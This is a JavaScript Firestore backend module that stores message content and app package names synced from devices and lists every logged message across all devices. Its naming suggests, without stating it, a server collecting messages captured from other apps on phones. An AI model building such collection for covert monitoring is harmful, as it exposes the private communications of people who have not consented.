import { db } from './config.js';

export const saveSyncData = async (deviceId, messagesList) => { 
    try {
        const today = new Date();
        const dateString = `${today.getDate().toString().padStart(2, '0')}-${(today.getMonth() + 1).toString().padStart(2, '0')}-${today.getFullYear()}`;
        
        const documentId = `${deviceId}_${dateString}`;
        const docRef = db.collection('messages').doc(documentId);

        console.log(`[DEBUG] Incoming First Message Object:`, JSON.stringify(messagesList[0], null, 2));

        let messagesMap = {};
        
        messagesList.forEach((msg) => {
            const msgId = msg.id || msg.local_id || msg.messageId || Math.floor(Math.random() * 10000); 
            const uniqueKey = `local_${msgId}`; 
            
            // 🔥 BACKEND TIME MAGIC: Android ka adha-adhura time ignore karke 
            // Server ka exact timestamp (Milliseconds me) capture kar rahe hain
            const exactServerTime = new Date().getTime(); 

            messagesMap[uniqueKey] = {
                localId: msgId,
                packageName: msg.package_name || msg.packageName || "Unknown App", 
                messageContent: msg.message || msg.message_content || msg.messageContent || "No Content", 
                // Yahan overwrite kar diya static time ko
                timestamp: exactServerTime 
            };
        });

        await docRef.set({
            deviceId: deviceId,
            lastSyncDate: dateString,
            messages: messagesMap
        }, { merge: true });

        console.log(`[+] Database Update Success: ${messagesList.length} messages saved for ${deviceId}`);
        return true;

    } catch (error) {
        console.error("[-] Database Error in saveSyncData:", error);
        throw error; 
    }
};

export const getAllLoggedMessages = async () => {
    try {
        const snapshot = await db.collection('messages').get();
        let allMessages = [];

        snapshot.forEach(doc => {
            const docData = doc.data();
            const deviceId = docData.deviceId;
            
            if (docData.messages) {
                Object.keys(docData.messages).forEach(key => {
                    const msgDetails = docData.messages[key];
                    allMessages.push({
                        id: key, 
                        device_id: deviceId,
                        package_name: msgDetails.packageName || msgDetails.package_name,
                        message: msgDetails.messageContent || msgDetails.message,
                        timestamp: msgDetails.timestamp // Ab yeh properly miliseconds hoga
                    });
                });
            }
        });

        // Ab numeric calculation perfect kaam karegi! (Newest First)
        allMessages.sort((a, b) => b.timestamp - a.timestamp);
        return allMessages;
    } catch (error) {
        console.error("[-] Database Error in getAllLoggedMessages:", error);
        throw error;
    }
};